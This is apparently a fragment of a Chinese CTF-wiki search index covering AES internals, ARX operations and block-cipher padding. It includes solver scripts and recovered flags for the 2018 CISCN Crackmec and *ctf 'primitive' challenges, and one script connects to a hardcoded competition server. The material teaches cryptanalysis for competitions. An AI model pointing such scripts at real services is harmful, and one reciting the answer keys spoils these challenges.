\u8f6e\u5bc6\u94a5\u52a0\uff0cAddRoundKey \u5b57\u8282\u66ff\u6362\uff0cSubBytes \u884c\u79fb\u4f4d\uff0cShiftRows \u5217\u6df7\u6dc6\uff0cMixColumns \u4e0a\u9762\u7684\u5217\u6df7\u6dc6\u7684\u77e9\u9635\u4e58\u6cd5\u7b49\u53f7\u5de6\u8fb9\u7684\u5217\u5411\u91cf\u5e94\u8be5\u5728\u53f3\u8fb9\u3002 \u8fd9\u91cc\u518d\u7ed9\u4e00\u5f20\u5176\u52a0\u89e3\u5bc6\u7684\u5168\u56fe\uff0c\u5176\u89e3\u5bc6\u7b97\u6cd5\u7684\u6b63\u786e\u6027\u5f88\u663e\u7136\u3002 \u6211\u4eec\u8fd9\u91cc\u91cd\u70b9\u5173\u6ce8\u4e00\u4e0b\u4ee5\u4e0b\u3002","title":"\u52a0\u89e3\u5bc6\u8fc7\u7a0b"},{"location":"crypto/blockcipher/aes/#_5","text":"\u5728\u5b57\u8282\u66ff\u6362\u7684\u80cc\u540e\uff0c\u5176\u5b9e\u662f\u6709\u5bf9\u5e94\u7684\u6570\u5b66\u89c4\u5219\u6765\u5b9a\u4e49\u5bf9\u5e94\u7684\u66ff\u6362\u8868\u7684\uff0c\u5982\u4e0b \u8fd9\u91cc\u7684\u8fd0\u7b97\u5747\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u5185\u3002","title":"\u5b57\u8282\u66ff\u6362"},{"location":"crypto/blockcipher/aes/#_6","text":"\u8fd9\u91cc\u7684\u8fd0\u7b97\u4e5f\u662f\u5b9a\u4e49\u5728 GF(2^8) GF(2^8) \u4e0a\uff0c\u4f7f\u7528\u7684\u6a21\u591a\u9879\u5f0f\u4e3a x^8+x^4+x^3+1 x^8+x^4+x^3+1 \u3002","title":"\u5217\u6df7\u6dc6"},{"location":"crypto/blockcipher/aes/#_7","text":"","title":"\u5bc6\u94a5\u6269\u5c55"},{"location":"crypto/blockcipher/aes/#_8","text":"\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0 \u4ea4\u6362\u9006\u5411\u884c\u79fb\u4f4d\u548c\u9006\u5411\u5b57\u8282\u4ee3\u66ff\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\u3002 \u4ea4\u6362\u8f6e\u5bc6\u94a5\u52a0\u548c\u9006\u5411\u5217\u6df7\u6dc6\u5e76\u4e0d\u5f71\u54cd\u7ed3\u679c\uff0c\u5173\u952e\u5728\u4e8e \u9996\u5148\u53ef\u4ee5\u628a\u5f02\u6216\u770b\u6210\u57df\u4e0a\u7684\u591a\u9879\u5f0f\u52a0\u6cd5 \u7136\u540e\u591a\u9879\u5f0f\u4e2d\u4e58\u6cd5\u5bf9\u52a0\u6cd5\u5177\u6709\u5206\u914d\u7387\u3002","title":"\u7b49\u4ef7\u89e3\u5bc6\u7b97\u6cd5"},{"location":"crypto/blockcipher/aes/#_9","text":"\u79ef\u5206\u653b\u51fb","title":"\u653b\u51fb\u65b9\u6cd5"},{"location":"crypto/blockcipher/aes/#2018-crackmec","text":"\u901a\u8fc7\u7b80\u5355\u5206\u6790\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7b97\u6cd5\u662f\u4e00\u4e2a\u7b80\u5316\u7248\u7684 AES\uff0c\u5176\u57fa\u672c\u64cd\u4f5c\u4e3a 9 \u8f6e\u8fed\u4ee3 \u884c\u79fb\u4f4d \u53d8\u79cd\u5b57\u8282\u66ff\u6362 \u5982\u4e0b memcpy ( cipher , plain , 0x10uLL ); for ( i = 0LL ; i <= 8 ; ++ i ) { shift_row ( cipher ); for ( j = 0LL ; j <= 3 ; ++ j ) * ( _DWORD * ) & cipher [ 4 * j ] = box [(( 4 * j + 3 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 3 ]] ^ box [(( 4 * j + 2 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 2 ]] ^ box [(( 4 * j + 1 + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j + 1 ]] ^ box [(( 4 * j + 16 * i ) << 8 ) + ( unsigned __int8 ) cipher [ 4 * j ]]; } result = shift_row ( cipher ); for ( k = 0LL ; k <= 0xF ; ++ k ) { result = subbytes [ 256 * k + ( unsigned __int8 ) cipher [ k ]]; cipher [ k ] = result ; } return result ; \u6839\u636e\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u6211\u4eec\u5df2\u77e5\u7a0b\u5e8f\u52a0\u5bc6\u7684\u7ed3\u679c\uff0c\u800c subbytes \u548c shift_row \u53c8\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u6700\u540e\u4e00\u8f6e\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 box \u5bf9\u5e94\u7684\u5e38\u6570\uff0c\u6211\u4eec\u53ea\u662f\u4e0d\u77e5\u9053\u4e0a\u4e00\u8f6e\u4e2d cipher[4*j] \u5bf9\u5e94\u7684\u503c\uff0c\u4e00\u5171 32 \u4f4d\uff0c\u5982\u679c\u6211\u4eec\u76f4\u63a5\u7206\u7834\u7684\u8bdd\uff0c\u663e\u7136\u4e0d\u53ef\u53d6\uff0c\u56e0\u4e3a\u6bcf\u4e00\u8f6e\u90fd\u9700\u8981\u8fd9\u4e48\u7206\u7834\uff0c\u65f6\u95f4\u4e0d\u53ef\u63a5\u53d7\u3002\u90a3\u4e48\u6709\u6ca1\u6709\u5176\u5b83\u529e\u6cd5\u5462\uff1f\u5176\u5b9e\u6709\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u5373\u9996\u5148\u679a\u4e3e\u6240\u6709\u7684 cipher[4*j] \u4e0e cipher[4*j+1] \u7684\u5b57\u8282\u7ec4\u5408\uff0c\u4e00\u5171256*256 \u79cd\u3002\u5728\u679a\u4e3e\u5269\u4e0b\u4e24\u4e2a\u5b57\u8282\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u8ba1\u7b97\u51fa\u5176\u4e0e\u5bc6\u6587\u7684\u5f02\u6216\u503c\uff0c\u7136\u540e\u53bb\u4e4b\u524d\u7684\u7ec4\u5408\u4e2d\u627e\uff0c\u5982\u679c\u627e\u5230\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u8fd9\u6837\u590d\u6742\u5ea6\u77ac\u95f4\u964d\u5230 O(2^{16}) O(2^{16}) \u3002 \u4ee3\u7801\u5982\u4e0b encflag = [ 0x16 , 0xEA , 0xCA , 0xCC , 0xDA , 0xC8 , 0xDE , 0x1B , 0x16 , 0x03 , 0xF8 , 0x84 , 0x69 , 0x23 , 0xB2 , 0x25 ] subbytebox = eval ( open ( './subbytes' ) . read ()) box = eval ( open ( './box' ) . read ()) print subbytebox [ - 1 ], box [ - 1 ] def inv_shift_row ( now ): tmp = now [ 13 ] now [ 13 ] = now [ 9 ] now [ 9 ] = now [ 5 ] now [ 5 ] = now [ 1 ] now [ 1 ] = tmp tmp = now [ 10 ] now [ 10 ] = now [ 2 ] now [ 2 ] = tmp tmp = now [ 14 ] now [ 14 ] = now [ 6 ] now [ 6 ] = tmp tmp = now [ 15 ] now [ 15 ] = now [ 3 ] now [ 3 ] = now [ 7 ] now [ 7 ] = now [ 11 ] now [ 11 ] = tmp return now def byte2num ( a ): num = 0 for i in range ( 3 , - 1 , - 1 ): num = num * 256 num += a [ i ] return num def getbytes ( i , j , target ): \"\"\" box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] box[((4 * j + 2 + 16 * i) << 8 )+ a2[4 * j + 2]] box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] box[((4 * j + 16 * i) << 8) + a2[4 * j]]; \"\"\" box01 = dict () for c0 in range ( 256 ): for c1 in range ( 256 ): num0 = (( 4 * j + 16 * i ) << 8 ) + c0 num1 = (( 4 * j + 1 + 16 * i ) << 8 ) + c1 num = box [ num0 ] ^ box [ num1 ] box01 [ num ] = ( c0 , c1 ) for c2 in range ( 256 ): for c3 in range ( 256 ): num2 = (( 4 * j + 2 + 16 * i ) << 8 ) + c2 num3 = (( 4 * j + 3 + 16 * i ) << 8 ) + c3 num = box [ num2 ] ^ box [ num3 ] calc = num ^ target if calc in box01 : c0 , c1 = box01 [ calc ] return c0 , c1 , c2 , c3 print 'not found' print i , j , target , calc exit ( 0 ) def solve (): a2 = [ 0 ] * 16 \"\"\" for ( k = 0LL; k <= 0xF; ++k ) { result = subbytesbox[256 * k + a2[k]]; a2[k] = result; } \"\"\" for i in range ( 15 , - 1 , - 1 ): tag = 0 for j in range ( 256 ): if subbytebox [ 256 * i + j ] == encflag [ i ]: # j = a2[k] tag += 1 a2 [ i ] = j if tag == 2 : print 'two number' , i exit ( 0 ) \"\"\" result = shift_row(a2); \"\"\" a2 = inv_shift_row ( a2 ) \"\"\" for ( i = 0LL; i <= 8; ++i ) { shift_row(a2); for ( j = 0LL; j <= 3; ++j ) *(_DWORD *)&a2[4 * j] = box[((4 * j + 3 + 16 * i) << 8) + a2[4 * j + 3]] ^ box[((4 * j + 2 + 16 * i) << 8) + a2[4 * j + 2]] ^ box[((4 * j + 1 + 16 * i) << 8) + a2[4 * j + 1]] ^ box[((4 * j + 16 * i) << 8) + a2[4 * j]]; } \"\"\" for i in range ( 8 , - 1 , - 1 ): tmp = [ 0 ] * 16 print 'round ' , i for j in range ( 0 , 4 ): num = byte2num ( a2 [ 4 * j : 4 * j + 4 ]) #print num, a2[4 * j:4 * j + 4] tmp [ 4 * j ], tmp [ 4 * j + 1 ], tmp [ 4 * j + 2 ], tmp [ 4 * j + 3 ] = getbytes ( i , j , num ) a2 = inv_shift_row ( tmp ) print a2 print '' . join ( chr ( c ) for c in a2 ) if __name__ == \"__main__\" : solve () \u8fd0\u884c\u7ed3\u679c \u279c cracemec git: ( master ) \u2717 python exp.py 211 3549048324 round 8 round 7 round 6 round 5 round 4 round 3 round 2 round 1 round 0 [ 67 , 73 , 83 , 67 , 78 , 98 , 35 , 97 , 100 , 102 , 115 , 64 , 70 , 122 , 57 , 51 ] CISCNb#adfs@Fz93","title":"2018 \u56fd\u8d5b Crackmec"},{"location":"crypto/blockcipher/aes/#_10","text":"2018 \u5f3a\u7f51\u676f \u51b3\u8d5b revolver","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/aes/#_11","text":"https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86 Cryptography and Network Security\uff0c Advanced Encryption Standard ppt","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/blockcipher/arx-operations/","text":"Add-Rotate-Xor \u00b6 \u6982\u8ff0 \u00b6 ARX \u8fd0\u7b97\u662f\u5982\u4e0b 3 \u79cd\u57fa\u672c\u8fd0\u7b97\u7684\u7edf\u79f0 - Add \u6709\u9650\u57df\u4e0a\u7684\u6a21\u52a0 - Rotate \u5faa\u73af\u79fb\u4f4d - Xor \u5f02\u6216 \u6709\u8bb8\u591a\u5e38\u89c1\u7684\u5757\u52a0\u5bc6\u7b97\u6cd5\u5728\u8f6e\u51fd\u6570\u4e2d\u53ea\u7528\u5230\u4e86\u8fd9 3 \u79cd\u57fa\u672c\u8fd0\u7b97\uff0c\u5178\u578b\u4f8b\u5b50\u5982 Salsa20\u3001Speck \u7b49\u3002\u53e6\u5916 IDEA \u4e5f\u91c7\u7528\u4e86\u7c7b\u4f3c\u7684\u57fa\u672c\u8fd0\u7b97\u6765\u6784\u5efa\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff0c\u4e0d\u8fc7\u4ee5\u4e58\u6cd5\u4ee3\u66ff\u4e86\u79fb\u4f4d\u3002 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u64cd\u4f5c\u7b80\u5355\uff0c\u8fd0\u7b97\u901f\u5ea6\u5feb \u6267\u884c\u65f6\u95f4\u4e3a\u5e38\u6570\uff0c\u53ef\u4ee5\u907f\u514d\u57fa\u4e8e\u65f6\u95f4\u7684\u6d4b\u4fe1\u9053\u653b\u51fb \u7ec4\u5408\u540e\u7684\u51fd\u6570\u8868\u8fbe\u80fd\u529b\u8db3\u591f\u5f3a\uff08\u53c2\u89c1\u4e0b\u65b9\u4f8b\u9898\uff09 \u7f3a\u70b9 \u00b6 \u5728\u4e09\u79cd\u57fa\u672c\u8fd0\u7b97\u5f53\u4e2d\uff0cRotate\u3001Xor \u5bf9\u4e8e\u5355\u4e2a bit \u6765\u8bf4\u5747\u662f\u5b8c\u5168\u7ebf\u6027\u7684\u8fd0\u7b97\uff0c\u53ef\u80fd\u4f1a\u5e26\u6765\u4e00\u5b9a\u7684\u8106\u5f31\u6027(\u53c2\u89c1 Rotational cryptanalysis ) \u9898\u76ee \u00b6 2018 *ctf primitive \u00b6 \u5206\u6790 \u00b6 \u672c\u9898\u8981\u6c42\u6211\u4eec\u7ec4\u5408\u4e00\u5b9a\u6570\u76ee\u4ee5\u5185\u7684 Add-Rotate-Xor \u8fd0\u7b97\uff0c\u4f7f\u5f97\u83b7\u5f97\u7684\u52a0\u5bc6\u7b97\u6cd5\u80fd\u591f\u5c06\u56fa\u5b9a\u660e\u6587\u52a0\u5bc6\u6210\u6307\u5b9a\u7684\u968f\u673a\u5bc6\u6587\uff0c\u5373\u901a\u8fc7\u57fa\u7840\u8fd0\u7b97\u6765\u6784\u5efa\u4efb\u610f\u7f6e\u6362\u51fd\u6570\u3002\u6210\u529f\u6784\u5efa 3 \u6b21\u4e4b\u540e\u5373\u53ef\u83b7\u5f97 flag\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u5bf9\u4e8e\u6a21 256 \u4e0b\u7684\u8fd0\u7b97\uff0c\u4e00\u79cd\u5178\u578b\u7684\u57fa\u4e8e ARX \u7684\u6362\u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8868\u793a\u4e3a\u5982\u4e0b\u7ec4\u5408 RotateLeft_1(Add_255(RotateLeft_7(Add_2(x)))) \u4e0a\u8ff0\u51fd\u6570\u5bf9\u5e94\u4e86\u4e00\u4e2a\u5c06 254 \u548c 255 \u8fdb\u884c\u4ea4\u6362\uff0c\u540c\u65f6\u4fdd\u6301\u5176\u5b83\u6570\u5b57\u4e0d\u53d8\u7684\u7f6e\u6362\u8fd0\u7b97\u3002 \u76f4\u89c9\u4e0a\u6765\u8bf4\uff0c\u7531\u4e8e\u5728\u7b2c\u4e00\u6b65\u7684\u6a21\u52a0 2 \u8fd0\u7b97\u4e2d\uff0c\u4ec5\u6709\u8f93\u5165\u4e3a 254\u3001255 \u65f6\u4f1a\u53d1\u751f\u8fdb\u4f4d\uff0c\u8be5\u7ec4\u5408\u51fd\u6570\u5f97\u4ee5\u533a\u522b\u5bf9\u5f85\u8fd9\u4e00\u60c5\u51b5\u3002 \u5229\u7528\u4e0a\u8ff0\u539f\u5b50\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u4efb\u610f\u4e24\u4e2a\u6570\u5b57 a,b \u7684\u7f6e\u6362\uff0c\u7ed3\u5408 Xor \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u51cf\u5c11\u6240\u9700\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u76ee\uff0c\u4f7f\u5176\u6ee1\u8db3\u9898\u76ee\u7ed9\u51fa\u7684\u9650\u5236\u3002\u4e00\u79cd\u53ef\u80fd\u7684\u64cd\u4f5c\u6b65\u9aa4\u5982\u4e0b\uff1a \u5bf9\u4e8e a,b \uff0c\u901a\u8fc7\u6a21\u52a0\u64cd\u4f5c\u4f7f\u5f97 a \u4e3a0 \u901a\u8fc7\u53f3\u79fb\u4f7f\u5f97b\u7684\u6700\u4f4e\u4f4d\u4e3a 1 \u82e5 b \u4e0d\u4e3a 1\uff0c\u8fdb\u884c Xor 1, Add 255 \u64cd\u4f5c\uff0c\u4fdd\u6301 a \u4ecd\u7136\u4e3a0\uff0c\u540c\u65f6 b \u7684\u6570\u503c\u51cf\u5c0f \u91cd\u590d\u64cd\u4f5c2-3\u76f4\u81f3 b \u4e3a1 \u8fdb\u884c Add 254 \u53ca\u6362\u4f4d\u64cd\u4f5c\uff0c\u4ea4\u6362 a,b \u5bf9\u4e8e\u6362\u4f4d\u4ee5\u5916\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u52a0\u5165\u5bf9\u5e94\u7684\u9006\u8fd0\u7b97\uff0c\u786e\u4fdd a,b \u4ee5\u5916\u7684\u6570\u503c\u4e0d\u53d8 \u5b8c\u6574\u7684\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import string from hashlib import sha256 #context.log_level='debug' def dopow (): chal = c . recvline () post = chal [ 12 : 28 ] tar = chal [ 33 : - 1 ] c . recvuntil ( ':' ) found = iters . bruteforce ( lambda x : sha256 ( x + post ) . hexdigest () == tar , string . ascii_letters + string . digits , 4 ) c . sendline ( found ) #c = remote('127.0.0.1',10001) c = remote ( '47.75.4.252' , 10001 ) dopow () pt = 'GoodCipher' def doswap ( a , b ): if a == b : return if a > b : tmp = b b = a a = tmp ans = [] ans . append (( 0 , 256 - a )) b -= a a = 0 while b != 1 : tmp = 0 lo = 1 while b & lo == 0 : lo <<= 1 tmp += 1 if b == lo : ans . append (( 1 , 8 - tmp )) break if tmp != 0 : ans . append (( 1 , 8 - tmp )) b >>= tmp ans . append (( 2 , 1 )) b ^= 1 ans . append (( 0 , 255 )) b -= 1 ans . append (( 0 , 254 )) for a , b in ans : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in [( 0 , 2 ),( 1 , 7 ),( 0 , 255 ),( 1 , 1 )]: c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in ans [:: - 1 ]: if a == 0 : c . sendline ( ' %d %d ' % ( a , 256 - b )) elif a == 1 : c . sendline ( ' %d %d ' % ( a , 8 - b )) elif a == 2 : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for i in range ( 3 ): print i m = range ( 256 ) c . recvuntil ( 'ciphertext is ' ) ct = c . recvline () . strip () ct = ct . decode ( 'hex' ) assert len ( ct ) == 10 for i in range ( 10 ): a = ord ( ct [ i ]) b = ord ( pt [ i ]) #print m[a],b doswap ( m [ a ], b ) for j in range ( 256 ): if m [ j ] == b : m [ j ] = m [ a ] m [ a ] = b break c . sendline ( '-1' ) c . recvuntil ( 'Your flag here. \\n ' ) print c . recvline ()","title":"ARX"},{"location":"crypto/blockcipher/arx-operations/#add-rotate-xor","text":"","title":"Add-Rotate-Xor"},{"location":"crypto/blockcipher/arx-operations/#_1","text":"ARX \u8fd0\u7b97\u662f\u5982\u4e0b 3 \u79cd\u57fa\u672c\u8fd0\u7b97\u7684\u7edf\u79f0 - Add \u6709\u9650\u57df\u4e0a\u7684\u6a21\u52a0 - Rotate \u5faa\u73af\u79fb\u4f4d - Xor \u5f02\u6216 \u6709\u8bb8\u591a\u5e38\u89c1\u7684\u5757\u52a0\u5bc6\u7b97\u6cd5\u5728\u8f6e\u51fd\u6570\u4e2d\u53ea\u7528\u5230\u4e86\u8fd9 3 \u79cd\u57fa\u672c\u8fd0\u7b97\uff0c\u5178\u578b\u4f8b\u5b50\u5982 Salsa20\u3001Speck \u7b49\u3002\u53e6\u5916 IDEA \u4e5f\u91c7\u7528\u4e86\u7c7b\u4f3c\u7684\u57fa\u672c\u8fd0\u7b97\u6765\u6784\u5efa\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff0c\u4e0d\u8fc7\u4ee5\u4e58\u6cd5\u4ee3\u66ff\u4e86\u79fb\u4f4d\u3002","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/arx-operations/#_2","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/arx-operations/#_3","text":"\u64cd\u4f5c\u7b80\u5355\uff0c\u8fd0\u7b97\u901f\u5ea6\u5feb \u6267\u884c\u65f6\u95f4\u4e3a\u5e38\u6570\uff0c\u53ef\u4ee5\u907f\u514d\u57fa\u4e8e\u65f6\u95f4\u7684\u6d4b\u4fe1\u9053\u653b\u51fb \u7ec4\u5408\u540e\u7684\u51fd\u6570\u8868\u8fbe\u80fd\u529b\u8db3\u591f\u5f3a\uff08\u53c2\u89c1\u4e0b\u65b9\u4f8b\u9898\uff09","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/arx-operations/#_4","text":"\u5728\u4e09\u79cd\u57fa\u672c\u8fd0\u7b97\u5f53\u4e2d\uff0cRotate\u3001Xor \u5bf9\u4e8e\u5355\u4e2a bit \u6765\u8bf4\u5747\u662f\u5b8c\u5168\u7ebf\u6027\u7684\u8fd0\u7b97\uff0c\u53ef\u80fd\u4f1a\u5e26\u6765\u4e00\u5b9a\u7684\u8106\u5f31\u6027(\u53c2\u89c1 Rotational cryptanalysis )","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/arx-operations/#_5","text":"","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/arx-operations/#2018-ctf-primitive","text":"","title":"2018 *ctf primitive"},{"location":"crypto/blockcipher/arx-operations/#_6","text":"\u672c\u9898\u8981\u6c42\u6211\u4eec\u7ec4\u5408\u4e00\u5b9a\u6570\u76ee\u4ee5\u5185\u7684 Add-Rotate-Xor \u8fd0\u7b97\uff0c\u4f7f\u5f97\u83b7\u5f97\u7684\u52a0\u5bc6\u7b97\u6cd5\u80fd\u591f\u5c06\u56fa\u5b9a\u660e\u6587\u52a0\u5bc6\u6210\u6307\u5b9a\u7684\u968f\u673a\u5bc6\u6587\uff0c\u5373\u901a\u8fc7\u57fa\u7840\u8fd0\u7b97\u6765\u6784\u5efa\u4efb\u610f\u7f6e\u6362\u51fd\u6570\u3002\u6210\u529f\u6784\u5efa 3 \u6b21\u4e4b\u540e\u5373\u53ef\u83b7\u5f97 flag\u3002","title":"\u5206\u6790"},{"location":"crypto/blockcipher/arx-operations/#_7","text":"\u5bf9\u4e8e\u6a21 256 \u4e0b\u7684\u8fd0\u7b97\uff0c\u4e00\u79cd\u5178\u578b\u7684\u57fa\u4e8e ARX \u7684\u6362\u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8868\u793a\u4e3a\u5982\u4e0b\u7ec4\u5408 RotateLeft_1(Add_255(RotateLeft_7(Add_2(x)))) \u4e0a\u8ff0\u51fd\u6570\u5bf9\u5e94\u4e86\u4e00\u4e2a\u5c06 254 \u548c 255 \u8fdb\u884c\u4ea4\u6362\uff0c\u540c\u65f6\u4fdd\u6301\u5176\u5b83\u6570\u5b57\u4e0d\u53d8\u7684\u7f6e\u6362\u8fd0\u7b97\u3002 \u76f4\u89c9\u4e0a\u6765\u8bf4\uff0c\u7531\u4e8e\u5728\u7b2c\u4e00\u6b65\u7684\u6a21\u52a0 2 \u8fd0\u7b97\u4e2d\uff0c\u4ec5\u6709\u8f93\u5165\u4e3a 254\u3001255 \u65f6\u4f1a\u53d1\u751f\u8fdb\u4f4d\uff0c\u8be5\u7ec4\u5408\u51fd\u6570\u5f97\u4ee5\u533a\u522b\u5bf9\u5f85\u8fd9\u4e00\u60c5\u51b5\u3002 \u5229\u7528\u4e0a\u8ff0\u539f\u5b50\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u4efb\u610f\u4e24\u4e2a\u6570\u5b57 a,b \u7684\u7f6e\u6362\uff0c\u7ed3\u5408 Xor \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u51cf\u5c11\u6240\u9700\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u76ee\uff0c\u4f7f\u5176\u6ee1\u8db3\u9898\u76ee\u7ed9\u51fa\u7684\u9650\u5236\u3002\u4e00\u79cd\u53ef\u80fd\u7684\u64cd\u4f5c\u6b65\u9aa4\u5982\u4e0b\uff1a \u5bf9\u4e8e a,b \uff0c\u901a\u8fc7\u6a21\u52a0\u64cd\u4f5c\u4f7f\u5f97 a \u4e3a0 \u901a\u8fc7\u53f3\u79fb\u4f7f\u5f97b\u7684\u6700\u4f4e\u4f4d\u4e3a 1 \u82e5 b \u4e0d\u4e3a 1\uff0c\u8fdb\u884c Xor 1, Add 255 \u64cd\u4f5c\uff0c\u4fdd\u6301 a \u4ecd\u7136\u4e3a0\uff0c\u540c\u65f6 b \u7684\u6570\u503c\u51cf\u5c0f \u91cd\u590d\u64cd\u4f5c2-3\u76f4\u81f3 b \u4e3a1 \u8fdb\u884c Add 254 \u53ca\u6362\u4f4d\u64cd\u4f5c\uff0c\u4ea4\u6362 a,b \u5bf9\u4e8e\u6362\u4f4d\u4ee5\u5916\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u52a0\u5165\u5bf9\u5e94\u7684\u9006\u8fd0\u7b97\uff0c\u786e\u4fdd a,b \u4ee5\u5916\u7684\u6570\u503c\u4e0d\u53d8 \u5b8c\u6574\u7684\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import string from hashlib import sha256 #context.log_level='debug' def dopow (): chal = c . recvline () post = chal [ 12 : 28 ] tar = chal [ 33 : - 1 ] c . recvuntil ( ':' ) found = iters . bruteforce ( lambda x : sha256 ( x + post ) . hexdigest () == tar , string . ascii_letters + string . digits , 4 ) c . sendline ( found ) #c = remote('127.0.0.1',10001) c = remote ( '47.75.4.252' , 10001 ) dopow () pt = 'GoodCipher' def doswap ( a , b ): if a == b : return if a > b : tmp = b b = a a = tmp ans = [] ans . append (( 0 , 256 - a )) b -= a a = 0 while b != 1 : tmp = 0 lo = 1 while b & lo == 0 : lo <<= 1 tmp += 1 if b == lo : ans . append (( 1 , 8 - tmp )) break if tmp != 0 : ans . append (( 1 , 8 - tmp )) b >>= tmp ans . append (( 2 , 1 )) b ^= 1 ans . append (( 0 , 255 )) b -= 1 ans . append (( 0 , 254 )) for a , b in ans : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in [( 0 , 2 ),( 1 , 7 ),( 0 , 255 ),( 1 , 1 )]: c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in ans [:: - 1 ]: if a == 0 : c . sendline ( ' %d %d ' % ( a , 256 - b )) elif a == 1 : c . sendline ( ' %d %d ' % ( a , 8 - b )) elif a == 2 : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for i in range ( 3 ): print i m = range ( 256 ) c . recvuntil ( 'ciphertext is ' ) ct = c . recvline () . strip () ct = ct . decode ( 'hex' ) assert len ( ct ) == 10 for i in range ( 10 ): a = ord ( ct [ i ]) b = ord ( pt [ i ]) #print m[a],b doswap ( m [ a ], b ) for j in range ( 256 ): if m [ j ] == b : m [ j ] = m [ a ] m [ a ] = b break c . sendline ( '-1' ) c . recvuntil ( 'Your flag here. \\n ' ) print c . recvline ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/blockcipher/block-cipher-mode/","text":"\u5206\u7ec4\u6a21\u5f0f \u00b6 \u5206\u7ec4\u52a0\u5bc6\u4f1a\u5c06\u660e\u6587\u6d88\u606f\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u6bcf\u5757\u660e\u6587\u5206\u522b\u5728\u5bc6\u94a5\u63a7\u5236\u4e0b\u52a0\u5bc6\u4e3a\u5bc6\u6587\u3002\u5f53\u7136\u5e76\u4e0d\u662f\u6bcf\u4e2a\u6d88\u606f\u90fd\u662f\u76f8\u5e94\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u586b\u5145\u3002 \u586b\u5145\u89c4\u5219 \u00b6 \u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u5728\u5206\u7ec4\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u7684\u957f\u5ea6\u5f80\u5f80\u5e76\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u9700\u8981\u8fdb\u884c padding\uff0c\u800c\u5982\u4f55 padding \u76ee\u524d\u4e5f\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u7684\u89c4\u5b9a\u3002 \u5e38\u89c1\u7684 \u586b\u5145\u89c4\u5219 \u5982\u4e0b\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u6d88\u606f\u7684\u957f\u5ea6\u662f\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u4ecd\u7136\u9700\u8981\u586b\u5145\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5728\u89e3\u5bc6\u4e4b\u540e\u53d1\u73b0 Padding \u4e0d\u6b63\u786e\uff0c\u5219\u5f80\u5f80\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6211\u4eec\u4e5f\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053 Paddig \u662f\u5426\u6b63\u786e\u3002 Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding) \u00b6 \u4e3e\u4f8b\u5b50\u5982\u4e0b DES INPUT BLOCK = f o r _ _ _ _ _ (IN HEX) 66 6F 72 05 05 05 05 05 KEY = 01 23 45 67 89 AB CD EF DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40 Pad with 0x80 followed by zero bytes (OneAndZeroes Padding) \u00b6 